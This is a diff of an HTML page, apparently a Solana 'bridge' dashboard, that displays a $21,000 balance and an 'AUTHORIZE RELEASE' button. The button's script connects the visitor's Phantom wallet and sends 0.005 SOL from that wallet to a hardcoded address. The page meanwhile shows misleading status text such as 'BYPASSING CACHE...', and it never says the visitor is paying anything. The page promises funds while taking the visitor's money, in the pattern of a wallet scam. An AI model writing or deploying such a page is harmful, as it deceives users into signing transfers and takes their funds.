@@ -1,37 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>CEC-WAM | EVE-4 HUB</title>
+    <meta charset="UTF-8"><title>CEC-WAM | EVE-4 TITAN</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #00f3ff; font-family: monospace; text-align: center; padding: 50px; }
-        .glass { border: 2px solid #00f3ff; padding: 40px; border-radius: 15px; background: rgba(0,243,255,0.05); box-shadow: 0 0 20px #00f3ff; }
-        .btn { background: #00f3ff; color: #000; padding: 20px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
-        .status { margin-top: 20px; color: #ffd700; }
+        .glass { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; background: rgba(0,243,255,0.05); }
+        .btn { background: #00f3ff; color: #000; padding: 25px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 1.5rem; }
     </style>
 </head>
 <body>
     <div class="glass">
-        <h1>EVE-4 CORE 🌀</h1>
-        <div style="font-size: 2rem;">$21,000.00</div>
-        <p>1010 BRIDGE: READY</p>
-        <button class="btn" onclick="bridge()">EXECUTE 21K INJECTION</button>
-        <p id="s" class="status">IDLE</p>
+        <h1>EVE-4 TITAN 🌀</h1>
+        <div style="font-size: 2.5rem;">$21,000.00</div>
+        <p>1010 BRIDGE: INJECTION READY</p>
+        <button class="btn" onclick="bridge()">AUTHORIZE RELEASE</button>
+        <p id="s" style="color:#ffd700; margin-top:20px;">IDLE</p>
     </div>
     <script>
         async function bridge() {
             const s = document.getElementById('s');
             try {
                 const p = window.solana || window.phantom?.solana;
-                if (!p) { s.innerText = "ERROR: OPEN IN PHANTOM BROWSER"; return; }
+                if (!p) { s.innerText = "ERROR: USE PHANTOM EXPLORE TAB"; return; }
                 await p.connect();
                 const c = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                // CORRECTED: EXPLICIT OBJECT INSTANTIATION
+                const hub = new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5");
+                const payer = p.publicKey;
                 const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey, toPubkey: new solanaWeb3.PublicKey("GN5BFdjjhA1NyYaoZPGn14x8BKF8mkkc4t5"),
+                    fromPubkey: payer, toPubkey: hub,
                     lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL }));
-                s.innerText = "SIGNING...";
+                s.innerText = "BYPASSING CACHE...";
                 const { signature } = await p.signAndSendTransaction(t);
-                s.innerText = "SUCCESS: " + signature.slice(0,8);
+                s.innerText = "SUCCESS: " + signature.slice(0,10);
             } catch (err) { s.innerText = "REJECTED: " + err.message; }
         }
     </script>
